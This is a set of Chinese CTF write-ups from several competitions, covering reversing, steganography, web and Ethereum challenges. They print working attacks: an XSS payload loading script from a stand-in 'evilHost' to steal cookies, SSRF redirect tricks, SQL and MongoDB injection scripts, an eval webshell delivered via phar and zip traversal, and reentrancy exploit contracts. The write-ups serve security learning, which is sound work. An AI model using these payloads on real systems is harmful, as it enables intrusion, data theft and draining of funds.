# 11. 真的非常友善的逆向题（福利） 150

过程写在下面的注释里了：

```c
int __fastcall checkFlagHead(int a1, char a2)  // a1=flag string
{
  int v2; // eax@1
  char v3; // cl@1
  signed int v4; // eax@1
  __int128 v6; // [sp+0h] [bp-2Ch]@1
  int v7; // [sp+10h] [bp-1Ch]@1
  int v8; // [sp+14h] [bp-18h]@1
  int v9; // [sp+18h] [bp-14h]@1
  __int16 v10; // [sp+1Ch] [bp-10h]@1
  char v11; // [sp+1Eh] [bp-Eh]@1
  int v12; // [sp+20h] [bp-Ch]@1
  char v13; // [sp+24h] [bp-8h]@1
  char v14; // [sp+25h] [bp-7h]@1

  v9 = '7613';
  v10 = '45';
  v11 = 0;
  v2 = *(_DWORD *)a1;
  v3 = *(_BYTE *)(a1 + 4);
  v12 = v2;

  LOBYTE(v12) = '3' - v2;  // '3' - string[0]
  BYTE1(v12) = BYTE1(v9) - BYTE1(v12); // '1' - string[1]
  BYTE2(v12) = '6' - BYTE2(v2);
  BYTE3(v12) = '7' - BYTE3(v2);
  // 上面这里每个byte做一下减法变换，看看各位减得的负数是否跟下面v6一样
  v14 = 0;
  v13 = 53 - v3;
  v4 = 0;
  _mm_storeu_si128((__m128i *)&v6, _mm_load_si128((const __m128i *)&xmmword_415630));  // v6 <- 4bytes的负数xmmword_415630
  // 那么'3167'各bytes减v6各bytes得'HCTF'
  v7 = -70;
  v8 = -73;
  while ( *((_BYTE *)&v12 + v4) == *((_DWORD *)&v6 + v4) )  // 实质就是验证string前是否是HCTF{
  {
    ++v4;
    if ( v4 >= 5 )
      return SHIBYTE(v10) - a2 == -73;
  }
  return 0;
}

BOOL __userpurge DialogFunc@<eax>(char a1@<dil>, HWND hDlg, UINT a3, WPARAM a4, LPARAM a5)
{
  __int128 *v6; // edx@18
  signed int v7; // esi@21
  int v8; // edx@22
  int v9; // eax@30
  int v10; // eax@30
  int v11; // eax@30
  int v12; // eax@30
  signed int v13; // ecx@30
  CHAR String; // [sp+0h] [bp-24h]@1
  __int128 v15; // [sp+1h] [bp-23h]@1
  __int64 v16; // [sp+11h] [bp-13h]@1
  int v17; // [sp+19h] [bp-Bh]@1
  char v18; // [sp+1Dh] [bp-7h]@1

  String = 0;
  _mm_storel_epi64((__m128i *)&v16, 0i64);
  v17 = 0;
  v18 = 0;
  _mm_storeu_si128((__m128i *)&v15, 0i64);
  if ( a3 > 0x110 )
  {
    if ( a3 == 273 && !(a4 >> 16) && (_WORD)a4 == 1004 )
    {
      GetWindowTextA(dword_4191F8, &String, 30);
      v6 = &v15;
      if ( strlen(&String) == 22 )   // 检查长度
      {
        LOBYTE(v6) = BYTE4(v16);
        if ( sub_401DA0(&String, v6) )
        {
          if ( sub_401BB0(&String) )  // 二分查找，A~Z变成0~25, a~z变成100~125, '0'变成了200，把变换后的字符串与下面的数组比较
          {
            v7 = 0;
            while ( 1 )
            {
              v8 = dword_4191B0 ^ byte_418217;    // dword_4191B0取1,2 byte_418217不断rol，逆向的时候暴力下这几种可能就好
              if ( (dword_4191B0 ^ byte_418217) >= 0
                && dword_4191B0 != byte_418217    // 这里比较flag后面接的4位无意义字符
                && (v8 ^ (char)v16) == byte_418218
                && (v8 ^ SBYTE1(v16)) == byte_418219
                && (v8 ^ SBYTE2(v16)) == byte_41821A
                && (v8 ^ SBYTE3(v16)) == byte_41821B )
                break;
              Sleep(0x14u);
              ++v7;
              if ( v7 >= 100 )
                goto LABEL_28;
            }
            v9 = dword_4191D8;    // 这里还要交换几个bytes
            dword_4191D8 = dword_4191C0[0];
            dword_4191C0[0] = v9;
            v10 = dword_4191E0;
            dword_4191E0 = dword_4191CC;
            dword_4191CC = v10;
            v11 = dword_4191D4;
            dword_4191D4 = dword_4191C8;
            dword_4191C8 = v11;
            v12 = dword_4191D0;
            dword_4191D0 = dword_4191EC;
            v13 = 0;
            dword_4191EC = v12;
            do
            {
              if ( dword_415600[v13] != dword_4191C0[v13] )  // 比较上面变换后的字符串和数组
              {
                MessageBoxW(0, L"Try Again", L"Fail", 0);
                exit(-1);
              }
              ++v13;
            }
            while ( v13 < 12 );
            if ( v8 == 2 )
            {
              MessageBoxW(0, L"YOU GOT IT", L"OK", 0);
              exit(0);
            }
          }
        }
      }
LABEL_28:
      MessageBoxW(0, L"Try Again", L"Fail", 0);
    }
  }
  else if ( a3 == 272 )
  {
    hWnd = GetDlgItem(hDlg, 1004);
    dword_4191F8 = GetDlgItem(hDlg, 1003);
    hObject = (HANDLE)sub_4027B4(0, 0, (int)sub_401B90, 0, 0, 0);
    if ( !hObject )
    {
      sub_4029F6(&unk_415584, a1);
      return 0;
    }
  }
  else
  {
    if ( a3 == 16 )
    {
      CloseHandle(hObject);
      EndDialog(hDlg, 0);
      DestroyWindow(hDlg);
      return 0;
    }
    if ( a3 == 32 && hWnd == (HWND)a4 )
    {
      if ( dword_4181F8 == 34 )
      {
        MoveWindow(hWnd, 10, 10, 80, 35, 1);
        dword_4181F8 = 21;
        return 0;
      }
      if ( dword_4181F8 == 21 )
      {
        MoveWindow(hWnd, 20, 230, 80, 35, 1);
        dword_4181F8 = 24;
        return 0;
      }
      if ( dword_4181F8 == 24 )
      {
        MoveWindow(hWnd, 350, 230, 80, 35, 1);
        dword_4181F8 = 34;
        return 0;
      }
    }
  }
  return 0;
}
```

所以只要把那个比较用的数组提出来
```
66h
.rdata:00415604                 db  64h ; d
.rdata:00415608                 db 0C8h ; 
.rdata:0041560C                 db  68h ; h
.rdata:00415610                 db  75h ; u
.rdata:00415614                 db  75h ; u
.rdata:00415618                 db  14h
.rdata:0041561C                 db  0Bh
.rdata:00415620                 db  68h ; h
.rdata:00415624                 db  15h
.rdata:00415628                 db  68h ; h
.rdata:0041562C                 db  12h
```

然后改成十进制，对x，如果x==200那么x转成'0'，否则转成`(x%100+'A')+(x/100)*('a'-'A')`，然后按照上面的规则交换几个bytes    
拼接上上面的HCTF{和结尾的四位随机字符即可。


# 14.  送分要不要？（萌新点我） 50

![songfen](songfen.png)

在PNG前面有段base64全家桶，依次b64decode b32decode b16decode 得到flag

# 16. 无聊的题（出题人真无聊） 250

这题真坑爹，也真的是很无聊- -...     
网上找了原图，diff了一下很容易发现些异常....然而原图是jpg，好多噪点     

diff图如下：
![diff](lsb_diff.png)

在88行与201行，分别R与B通道有LSB....     
把原图与题目图的diff打印出来看看, 按col row 题图 原图顺序排列...

```
...
121 88 (150, 21, 15, 255) (134, 21, 15)
125 88 (136, 28, 18, 255) (152, 28, 18)
127 88 (147, 26, 17, 255) (146, 25, 16)
130 88 (158, 23, 17, 255) (142, 23, 17)
131 88 (162, 40, 35, 255) (162, 41, 33)
132 88 (133, 26, 19, 255) (149, 26, 19)
135 88 (123, 22, 15, 255) (107, 22, 15)
136 88 (100, 27, 13, 255) (116, 27, 13)
139 88 (120, 24, 15, 255) (104, 24, 15)
141 88 (109, 28, 21, 255) (125, 28, 21)
142 88 (111, 22, 18, 255) (127, 22, 18)
143 88 (125, 27, 16, 255) (109, 27, 16)
145 88 (98, 32, 34, 255) (114, 32, 34)
146 88 (119, 22, 18, 255) (102, 23, 18)
147 88 (156, 36, 27, 255) (140, 36, 27)
148 88 (147, 20, 11, 255) (131, 20, 11)
149 88 (110, 31, 27, 255) (126, 31, 27)
151 88 (108, 34, 25, 255) (124, 34, 25)
152 88 (109, 35, 27, 255) (125, 35, 27)
153 88 (147, 25, 25, 255) (131, 25, 25)
154 88 (121, 37, 26, 255) (105, 37, 26)
156 88 (121, 22, 18, 255) (105, 22, 18)
158 88 (111, 50, 44, 255) (127, 50, 44)
159 88 (106, 33, 29, 255) (122, 33, 29)
160 88 (70, 26, 25, 255) (86, 26, 25)
161 88 (91, 22, 18, 255) (75, 22, 18)
...
137 201 (150, 41, 40, 255) (150, 41, 44)
138 201 (147, 45, 37, 255) (147, 45, 33)
140 201 (139, 43, 41, 255) (139, 43, 45)
141 201 (120, 41, 24, 255) (120, 41, 28)
144 201 (142, 33, 24, 255) (142, 33, 28)
147 201 (144, 42, 44, 255) (144, 42, 40)
148 201 (158, 46, 40, 255) (158, 46, 44)
151 201 (161, 49, 41, 255) (161, 49, 45)
153 201 (168, 47, 32, 255) (168, 47, 36)
154 201 (179, 46, 45, 255) (179, 46, 41)
155 201 (156, 52, 45, 255) (156, 52, 41)
156 201 (159, 41, 33, 255) (159, 41, 37)
157 201 (164, 35, 26, 255) (164, 35, 30)
158 201 (176, 40, 24, 255) (176, 40, 28)
160 201 (142, 18, 22, 255) (142, 18, 18)
162 201 (186, 46, 37, 255) (186, 46, 33)
163 201 (178, 40, 29, 255) (180, 39, 29)
164 201 (186, 46, 41, 255) (185, 45, 44)
165 201 (130, 40, 25, 255) (130, 40, 29)
169 201 (159, 48, 24, 255) (159, 48, 28)
170 201 (167, 44, 33, 255) (167, 44, 37)
```

容易发现88行R部分大多相差16, 201行B部分相差4，于是提取出来，把偏移全部试一遍，即可得到flag

```python
>>> r1,g1,b1,a1 = Image.open('boring.png').split()
>>> s=''
>>> for col in xrange(106, 300):
...     pos=(col,88)
...     if ((r1.getpixel(pos))&16)==16:
...             s+='1'
...     else:
...             s+='0'
... 
>>> s
'10011001101100011000010110011100110001001110100110100001100011011101000110011001111011011011000101111100110100011011010101111100110111011010000100010101011111010001100100100101110010001100110011'
>>> def tobin8(s):
...     ret=''
...     for x in xrange(0, len(s), 8):
...             seg=s[x:x+8]
...             if len(seg)<8: return ret
...             ret+=chr(int(seg,2))
...     return ret
... 
>>> tobin8(s[6:])
'lag1:hctf{l_4m_7hE_FIr3'
# 上面列数取小了...后来把列数改大,可以得到完整的flag1：lag1:hctf{l_4m_7hE_FIr37_F14G}

for col in xrange(130, 500):
  pos=(col,201)
  if ((b1.getpixel(pos))&4)==4:
    s+='1'
  else:
    s+='0'
>> tobin8(s[7:])
'flag2:hctf{DoYouLoveLSB??},\xcf\x8c\x9538\xbaT9y\n\xde|\x87\xcb\xf3\x98\xd6j'

```

# 28. Hack my net 100

上来是
`http://120.26.224.102:25045/ea57f09ea421245047b86eaba834fae1/?u=http://nohackair.net:80/usr/themes/trapecho/css/bootstrap-responsive.min.css`这个url，
测试可知前面的`http://nohackair.net:80`是固定的，于是用alictf某题的绕过方法，加@绕过，如：`http://nohackair.net:80@baidu.com`返回baidu.com      
测试发现header里面有个`Config: http://localareanet/all.conf`，也就是想办法读这个conf    
测试发现后缀必须是.css，而且服务器会跟302重定向，那么，在自己的服务器上搭个nginx：
```
        location /test.css {
                add_header Content-Type text/css;
                return 302 http://localareanet/all.conf?u=/11.css;
        }
```

然后填`http://myEvilServer/test.css`即可看到flag（注：貌似会检查content-type,所以要加个test/css）

# 30. easy xss 150

```html
<body>
<?-- param: /?errmsg=a&t=1&debug=false -->
<?-- xssme: getmycookie.php?url=yourevilurl -->
<?-- DO NOT USE SCANNER OR BURP TOOLS , OR REGARDS AS CHEATING!!! -->
<!-- LOAD YOUR JS FILE,GET MY COOKIE,COME ON-->
<script>
var errormsg = 'error in js';
var type = '1';
(function(){
	try{
		$.get('./show.php?type='+type.toString(),function(msg){
			document.write(msg);
		});
	}catch(err){
		document.write(errormsg);
	}
	var debug = 'false';
	
})();
</script>
</body>
```

其中，catch块只有在type.toString()抛异常才会执行，那么我们要设法让type为null或undefined.
利用js的变量作用域的坑，debug填`';var type;'`那么就有`var debug = '';var type;'';`     

那么errormsg填payload就好了,过滤了斜杠可以用js字符转义`\x2f`来绕过     

payload:
`http://120.26.224.102:54250/0e7d4f3f7e0b6c0f4f6d1cd424732ec5/?errmsg=asd%3Cscript%20src=%27http:\x2f\x2fevilHost\x2fxss.js%27%3E%3C\x2fscript%3E&t=1&debug=%27;var%20type;%27`

xssme:
`http://120.26.224.102:54250/0e7d4f3f7e0b6c0f4f6d1cd424732ec5/getmycookie.php?url=http://120.26.224.102:54250/0e7d4f3f7e0b6c0f4f6d1cd424732ec5/?errmsg=asd%253Cscript%2520src=%2527http:\x2f\x2fevilHost\x2fxss.js%2527%253E%253C\x2fscript%253E%26t=1%26debug=%2527;var%2520type;%2527`

# 32. confused question 200

```php

<?php
session_start();
require('./db/db.php');
function addslashesForEvery($array){
	if(!is_array($array)){return addslashes($array);}
	foreach($array as $key => $val){
		$array[$key] = addslashes($val);
	}
	return $array;
}
$loginStr = $_GET['loginstr'];
if(!isset($_SESSION['admin'])){$loginStr = str_ireplace('admin','guest',$loginStr);}//前台不是admin
parse_str($loginStr,$loginStr);
foreach($loginStr as $n => $v){
	$v = addslashesForEvery($v);
	if($n === 'admin'){
		$username = $v['username'];
		$password = addslashesForEvery($_POST['password']);
		$sql = "select * from admin where username = '$username' and password = '$password'";
		$result = $DB->query($sql);
		if($result){$_SESSION['adminlogin'] = 1; echo "hctf{xxxxxxxx}";}
		break;
	}
	if($n === 'guest'){
		echo "Hello Guest!But you cannot log in!";
		break;
	}
	echo "null";
	break;
}

?>
```

这个没什么好说的，本地改下php跑跑试下就出来了...php的某些坑, 没有对应offset时出现的古怪行为...     
从效果上说，跟dz7.2那个洞有点像...

直接扔payload吧
```
?loginstr[admin]=%27&password=+union+select+1,1+--
````

本地测试代码添加的片段：
```php
$username = $v['username'];
var_dump($username, $v);
// 输出 Warning: Illegal string offset 'username' in D:\Winginx\home\localhost\y.php on line 58  string(1) "\" string(2) "\'"
```

在payload下sql语句变成
`string(78) "select * from admin where username = '\' and password = ' union select 1,1 --'" `


### File: CTF-Writeups/QWB2019/README.md

# QWB 2019

### 高明的黑客

之前因为我自己写过phpWebshell扫描器，直接拿过来魔改了几行代码就能直接扫出来了。    

![webshell_scan_stat](webshell_scan_result.png)

![webshell_scan_log_grep](scan_log_grep.png)

然后翻扫描log找到306行有问题：

![webshell_log](scan_log.png)

看了下就一个很裸的system函数调用，没什么好说了

![webshell_source](webshell_source.png)


### babybank

然后是两道baby以太坊智能合约题，opcode直接在线decompile一下（ https://ethervm.io/ ，现在竟有这么好用的工具），再根据solidity mapping的storage的空间布局很容易就能分析出代码逻辑，比ethernaut的题还要简单。   

这题的主要思路就是经典的重入攻击 ，外加`selfdestruct`可以送钱和预测合约地址这两个甜点。    


```solidity
pragma solidity ^0.4.23;

contract babybank {
    mapping(address => uint) public balance;
    mapping(address => uint) public level;
    address owner;
    uint secret;
    
    //Don't leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.
    //Gmail is ok. 163 and qq may have some problems.
    event sendflag(string md5ofteamtoken,string b64email); 
    
    constructor()public{
        owner = msg.sender;
    }
    
    //pay for flag
    function payforflag(string md5ofteamtoken,string b64email) public{
        require(balance[msg.sender] >= 10000000000);
        balance[msg.sender]=0;
        owner.transfer(address(this).balance);
        emit sendflag(md5ofteamtoken,b64email);
    }
    
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
	
	function profit() public;/* {
		if(level[msg.sender]) throw;
		if(msg.sender & 0xffff != 0xb1b1) throw;
		balance[msg.sender] += 1;
		level[msg.sender] += 1;
	}*/
	
	function guess(uint arg0);/* {
		if (arg0 != secret) throw;
		if (level[msg.sender] != 1) throw;
		balance[msg.sender] += 1;
		level[msg.sender] += 1;
	}*/
	
	function transfer(address arg0, uint arg1);/* {
		if (arg1 > balance[msg.sender])) throw;
		if (arg1 != 2) throw;
		if (level[msg.sender] != 2) throw;
		balance[msg.sender] = 0;
		balance[arg0] = arg1;
	}*/
	
	function withdraw(uint arg0);/* {
		if (arg0 != 0x02) throw;
		if (arg0 > balance[msg.sender]) throw;
		
		mem[0x80] = msg.sender.call.gas(msg.gas).value(arg0 * 1 ether)(mem[0x80]);
		balance[msg.sender] -= arg0;
	}*/
}

contract ForceSendValue {
    function mySend() payable {
        babybank f = babybank(0xd630cb8c3bbfd38d1880b8256ee06d168ee3859c);
        selfdestruct(f);
    }
}

contract exploit {
    babybank f = babybank(0xd630cb8c3bbfd38d1880b8256ee06d168ee3859c);
    address owner;
    bool hasBeenPaid = false;
    
    constructor() {
        owner = msg.sender;
        f.profit();
        f.guess(0x3fde42988fa35); // web3.eth.getStorageAt("0xd630cb8c3bbfd38d1880b8256ee06d168ee3859c", 3, console.log)
    }
    
    function() public payable {
        if (!hasBeenPaid) {
            hasBeenPaid = true;
            f.withdraw.gas(msg.gas)(2);
        }
    }
    
    function exp() payable {
        ForceSendValue _f = new ForceSendValue();
        _f.mySend.value(400000000000000).gas(msg.gas)();
        f.withdraw.gas(msg.gas)(2);
    }
    
    function submit() {
        string memory tok = "<TOK>";
        string memory email = "<EMAIL>";
        f.payforflag(tok, email);
        selfdestruct(owner);
    }
}
```

因为这题需要用到智能合约的fallback函数`msg.sender`只能是智能合约，`profit()`里要`msg.sender`地址结尾是`b1b1`，这就要求我们要能预测账号地址生成的合约地址，利用下面的脚本可以生成账号地址使nonce=0的交易的智能合约部署地址结尾符合要求。

```python
from web3 import Web3, HTTPProvider
import rlp
from rlp.utils import decode_hex, encode_hex, ascii_chr, str_to_bytes
w3 = Web3(HTTPProvider('https://ropsten.infura.io/SdO4U3ydQdgK3D3eNE2Y'))
w3.eth.enable_unaudited_features()

def normalize_address(x, allow_blank=False):
    if allow_blank and x == '':
        return ''
    if len(x) in (42, 50) and x[:2] == '0x':
        x = x[2:]
    if len(x) in (40, 48):
        x = decode_hex(x)
    if len(x) == 24:
        assert len(x) == 24 and sha3(x[:20])[:4] == x[-4:]
        x = x[:20]
    if len(x) != 20:
        raise Exception("Invalid address format: %r" % x)
    return x

def get_deployed_contract_addr(acc_address, nonce):
	return Web3.toHex(Web3.sha3(rlp.encode([normalize_address(acc_address), nonce]))[12:])[2:]

acc=w3.eth.account.create()
while not get_deployed_contract_addr(acc.address, 0).endswith('b1b1'): 
	acc = w3.eth.account.create()
print(acc.privateKey.__repr__())
```

另外这题回调fallback函数的时候需要送钱，又没有payable函数，因此`exploit::exp()`中利用合约`selfdestruct`的强制送钱机制先强行氪金一波。

### babybet

嗯其实这题比babybank还简单，准备工作也少了很多。分析一下字典没名字的函数是个transfer函数就可以汇集钱了，直接raw形式用签名哈希调用就ok了。我要吐槽一下这个非得100万，gas limit不够用非要手动部署十几次`exploit`合约......     

直接上exp吧也没什么好说的，就利用智能合约动态获取链上公开信息来破解模拟的几年前的菠菜代码而已。

```solidity
pragma solidity ^0.4.23;

contract babybet {
    mapping(address => uint) public balance;
    mapping(address => uint) public status;
    address owner;
    
    //Don't leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.
    //Gmail is ok. 163 and qq may have some problems.
    event sendflag(string md5ofteamtoken,string b64email); 
    
    constructor()public{
        owner = msg.sender;
        balance[msg.sender]=1000000;
    }

    //pay for flag
    function payforflag(string md5ofteamtoken,string b64email) public{
        require(balance[msg.sender] >= 1000000);
        if (msg.sender!=owner){
        balance[msg.sender]=0;}
        owner.transfer(address(this).balance);
        emit sendflag(md5ofteamtoken,b64email);
    }
    function profit();
    function bet(uint arg0);
	
	//function func_048F(address arg0, uint arg1); 0xf0d25268
}


contract exploit {
    constructor() {
        address owner = <OWNER>;
        for (uint i=0; i<50; i++) {
            address worker = new Worker();
        }
        selfdestruct(owner);
    }    
}

contract Worker {
    constructor() {
        bytes4 sign = 0xf0d25268;
        address owner = <OWNER>;
        babybet f = babybet(0x5d1beefd4de611caff204e1a318039324575599a);
        uint award = 1000;
        uint _owner = uint(owner);
        f.profit();
        uint b = uint(blockhash(block.number - 1)) % 3;
        f.bet(b);
        f.call(sign, _owner, award);
        selfdestruct(owner);
    }
}

```





### File: CTF-Writeups/QiangwangCup/README.md

# 2015强网杯Writeup

## Ringtone
用audacity打开ringtone.wav，查看频率分析，如图   
![FFT](FFT.bmp)   
显然高频区有问题，切换到spectrogram模式，如图，   
![spectrogram](spectrogram.bmp)   
可看到高频区域有一些信息，以0.1+0.4*x秒的模式来读，   
翻译成二进制得0b01100110、0b00110110，   
也即是"f6..."，猜测应该是"flag{...}"，   
多看几个字符后发现每8位结尾都是0，   
于是把每8bit倒序一下，得flag   
`flag{f0r3ns1c_1s_r3al1y_v3ry_ve7y_fun}`
吐槽一下flag太长了..人肉读二进制ascii真蛋疼= =   

## keygen
ida打开，发现0x400b56是关键部分，   
![before_md5](before_md5.bmp)   
发现是把v16~v23部分与一些常数结合后md5，然后   
![after_md5](after_md5.bmp)     
把MD5字符串这些转成对应字符的ascii码整数字符串，去掉0，   
![check_md5.bmp](check_md5.bmp)   
再选第5位后字符与v8~v15比较。   
然后发现要提交10个不同的sn才过。   
   
然后写keygen，随便乱生成v16~v23部分，加上常数部分后md5一下，   
计算出对应的v8~v15后填进sn的对应位，加上-就可以了，   
最后几位sn是废的，直接填1111   

下面的代码有些细节也许不对，偶尔生成的sn有问题，但懒得看了，反正换了几个字符串来生成sn就过了   
keygen.cpp     

	#include "md5.h"
	#include <iostream>

	using namespace std;

	void calc(const char *st) {
		MD5 a(st);
		const byte *p = a.digest();
		string v42 = "", res="";
		char buff[10];
		for(int k=0; k<=15; k++) {
			sprintf(buff, "%x", p[k]>>4);
			sprintf(buff, "%d", buff[0]);
			if(buff[0]!='0')
				v42+=buff;
			sprintf(buff, "%x", p[k]&0xf);
			sprintf(buff, "%d", buff[0]);
			if(buff[0]!='0')
				v42+=buff;
		}
		int pp=0, k=5;
		while(pp<8) {
			while(v42[pp+k]=='0') k++;
			res+=v42[pp+k];
			pp++;
		}
		printf("%c%c%c%c-%c%c%c%c-%c%c%c%c-%c%c%c%c-1111\n",
			res[3],
			st[0],
			st[8],
			res[7],
			res[6],
			res[4],
			st[4],
			res[5],
			st[2],
			st[6],
			res[1],
			st[10],
			res[0],
			st[12],
			st[14],
			res[2]);
	}

	int main() {
		calc("1413191117121012");
		calc("2413191117121012");
		calc("3413191117121012");
		calc("4413191117121012");
		calc("5413191117121012");
		calc("7413191117121012");
		calc("8413191117121012");
		calc("1413191117121022");
		calc("1413191117121032");
		calc("1413191117121002");
		return 0;
	}
 

得到的sn:
```
5115-6415-1111-8111-1111
4215-1815-1191-2117-1111
4314-7815-1191-1117-1111
4419-9819-1111-9112-1111
9519-8719-1111-9112-1111
5711-2415-1191-1117-1111
5818-4515-1191-9118-1111
5119-9215-1151-7121-1111
1118-4112-1151-8137-1111
8115-5111-1181-4104-1111
```

## 俳句

容易发现url有形如`/index.php?page=[upload|view]`   
发现LFI，用php filter来获取源代码   
```
/index.php?page=php://filter/read=convert.base64-encode/resource=index
/index.php?page=php://filter/read=convert.base64-encode/resource=main
/index.php?page=php://filter/read=convert.base64-encode/resource=view
/index.php?page=php://filter/read=convert.base64-encode/resource=upload
```
发现有upload_paiju文件夹，还有index.php里有   
```
$inc=sprintf("%s.php", $p);
include($inc);
```
用%00无法截断".php"无法直接include .txt，于是用phar来绕过这个：   
制作一个名为1.txt的zip里面放a.php    
a.php: `<?php eval($_GET['cmd']);?>`
上传1.txt，用   
`/index.php?page=phar://upload_paiju/xxxxxxx.txt/a`
来成功include，然后是各种列目录：   
`/index.php?cmd=print_r(scandir('/tmp'));&page=phar://./upload_paiju/xxxxxxx.txt/a`

tmp目录，html目录(都是open_basedir)都找遍也没发现flag，    
然后是队友发现藏在/srv(另外一open_basedir下)，有个FLAG文件...    
那就`/index.php?cmd=print_r(file_get_contents('/srv/FLAG'));&page=phar://./upload_paiju/xxxxxxx.txt/a`得flag


### File: CTF-Writeups/RCTF2015/README.md

# RCTF 2015

## weeeeeb3	WEB	150

先注册个账户，登陆进去发现cookie里面有个字段，发现其实是md5("$uid:$username")     
尝试把它改掉，发现自己个人信息页进不去了，结合forget password页来看，估计就是用忘记密码找回admin账号，    
把那个字段改成md5("1:admin")，个人信息页的url中把uid=1，就可以看见admin是1993/01/01的福建省福州市闽侯县人，
然后找回密码就可以了（然而好像有人搅屎，改了好几次才登录进去）    
进入admin后台，发现原代码里是要module=filemanage&do=???，猜测是do=upload    
发现页面给了个上传文件的表单（吐槽一下这次怎么全是要上传文件- -），表现如下：    
- 上传.php后缀：返回is a php!
- 上传非.php后缀，content-type改成image/jpg: you know what i want
- 上传.php5后缀，content-type改成image/jpg:: not a really php file
- 文件里含有<?php : something shows that is a php file!

最后翻官网
http://php.net/manual/en/language.basic-syntax.phptags.php
上传`<script language="php">`成功拿到flag.

## login WEB 300

### Mongo注入

```python
import requests, string

headers = {
	'Cookie': 'user=czo1OiJndWVzdCI7',
	'X-Requested-With': 'XMLHttpRequest'
}

def probe(name, pwd):
	data = {
		'username[$regex]': '/^' + ''.join(['\\x%02x' % ord(x) for x in name]) + '.*$/',
		'password[$regex]': '/^' + ''.join(['\\x%02x' % ord(x) for x in pwd]) + '.*$/',
	}
	r = requests.post('http://180.76.178.54:8005/53a0fb1b692f02436c3b5dda1db9c361/checkLogin.php', headers=headers, data=data)
	if 'I think you can get them' in r.content:
		return True
	assert 'username or password error' in r.content
	return False

cur_user = 'ROIS_ADMIN'
cur_pass = 'pas5woRd_i5_45e2884c4e5b9df49c747e1d'

while True:
	print 'Cur:', cur_user
	for c in string.printable:
		if probe(cur_user + c, ''):
			cur_user += c
			break
	else:
		break

while True:
	print 'Cur:', cur_pass
	for c in string.printable:
		if probe(cur_user, cur_pass + c):
			cur_pass += c
			break
	else:
		break

print 'User:', cur_user
print 'Pass:', cur_pass
```

成功得到用户名，密码
```
cur_user = 'ROIS_ADMIN'
cur_pass = 'pas5woRd_i5_45e2884c4e5b9df49c747e1d'
```

### 登录后台

服务器关了有点蛋疼，记不太清后台页面说了一大堆什么
看到界面里有个上传zip的地方，大概还有就是根据页面给的提示，
给了个pclzip 2.8.2模块的代码（后来发现修改过），
还有html页面源代码里藏了一部分php代码，发现要碰撞一个PBKDF2才能上传文件
也就是上传文件是user-agent必须以rois_special_user_agent开头，长为65，
$_COOKIE['backdoor']要跟ua的hash一样，那么要构造碰撞

### PBKDF2+HMAC hash collisions

直接把下面网址的代码copy下来改改就好了
https://mathiasbynens.be/notes/pbkdf2-hmac

```python
#!/usr/bin/env python
# coding=utf-8

import hashlib
import itertools
import re
import string
import sys

TOTAL_LENGTH = 65
PREFIX = 'rois_special_user_agent'

prefix_length = len(PREFIX)
brute_force_length = TOTAL_LENGTH - prefix_length
passwords = itertools.product(string.ascii_lowercase, repeat=brute_force_length)
regex_printable = re.compile('[\x20-\x7E]+$')
base_hasher = hashlib.sha1()
base_hasher.update(PREFIX)

for item in itertools.imap(''.join, passwords):
  hasher = base_hasher.copy()
  hasher.update(item)
  sha1_hash = hasher.digest()
  if regex_printable.match(sha1_hash):
    print u'%s \U0001F4A5 %s'.encode('utf-8') % (PREFIX + item, sha1_hash)
```

跑出来的结果
![WEB300_HASH_COLL](web300_hash.png)

所以：
`User-Agent:rois_special_user_agentaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaamipvkd`
`backdoor=3-Rfm^Bq%3bZZAcl]mS&eE`

### 构造特殊zip

一开始不知道要干嘛，上传什么zip,后来发现上传路径里面是/upload/image/*    
后来搜到这篇帖子:
http://www.sa666.com/thread-39060-1-1.html

参考那篇帖子，构造一个压缩包，内含有
1.php
../1.php
../../1.php
../../../1.php
然后把某个文件在zip中的部分破坏一下，全改成a，让解压到一半的时候异常退出，防止解压出的文件被删掉
![WEB300_BAD_ZIP](web300_bad_zip.png)

### 本地测试
把那个.php.bak下载下来，改名叫pclzip.php，本地用下面的代码跑跑解压构造好的zip看看，
```php
<?php
require('pclzip.php');
$pclzip = new PclZip('w.zip');
var_dump($pclzip->extract());
var_dump($pclzip->errorInfo(true));
```

发现解压出来的文件被改了名字，是一个md5，搜了下pclzip.php，发现4415行中
```php
    // ----- Get filename
    if ($p_header['filename_len'] != 0)  {
      $p_header['filename'] = fread($this->zip_fd, $p_header['filename_len']);
      $preNum = substr_count($p_header['filename'], '../');
      $prefix = str_repeat('../', $preNum);
      $element = explode('.', str_replace($prefix, '', $p_header['filename']));
      $fname = $prefix . md5($element[0]. 'RoisFighting'). '.' .end($element);
      $p_header['filename'] = $fname;
    }
```
可见解压出的文件名字是md5(原文件名 . 'RoisFighting').

把压缩包上传上去，返回fail，说明成功了
![WEB300_payload](web300_payload.png)

访问新文件名对应的url就可以拿到flag了。



### File: CTF-Writeups/RCTF2019/README.md

# RCTF2019

### REV - source_guardian

这题只要魔改下php内核应该就能很容易得到opcode了，之前也魔改过内核于是来玩玩看，感觉并不难，还不如说opcode的逆向比较烦人...据说这题有rmb玩家...     

git clone & checkout个7.3的版本，windows上编译的话还要下载下`php-sdk-binary-tools`，`.\buildconf && .\configure --disable-zts --disable-debug`选了NTS版本,下载选了NTS版本loaders，然后`php.ini`设`zend_extension=<loader_path>`基本就算布置好环境（还有要x64编译，用64位的loader，否则32位的会load不了）。这里选用cli SAPI编译后有`php.exe`，同目录放`php.ini`就好。      

魔改代码后如果只改了`*.h`没有改`*.c`要强行在`*.c`加些空格什么的，让`makefile`的依赖检测到时间戳变化，触发`nmake`时重新编译。

被三番四次魔改过的php内核diff：

```diff
----------------------------- Zend/zend_execute.h -----------------------------
index d09a3f3..cd7612a 100644
@@ -171,6 +171,20 @@ ZEND_API void zend_vm_stack_init(void);
 ZEND_API void zend_vm_stack_destroy(void);
 ZEND_API void* zend_vm_stack_extend(size_t size);
 
+ZEND_API void php_my_compile_string(zend_execute_data *call, uint32_t num_args);
+
+ZEND_API zend_op_array *(*zend_compile_file)(zend_file_handle *file_handle, int type);
+typedef zend_op_array *(*comp_file_t)(zend_file_handle *file_handle, int type);
+static comp_file_t sg_comp_file = NULL;
+
+extern void vld_dump_oparray (zend_op_array *opa);
+
+static zend_op_array *new_zend_compile_file(zend_file_handle *file_handle, int type) {
+	zend_op_array *op_arr = sg_comp_file(file_handle, type);
+	vld_dump_oparray(op_arr);
+	return op_arr;
+}
+
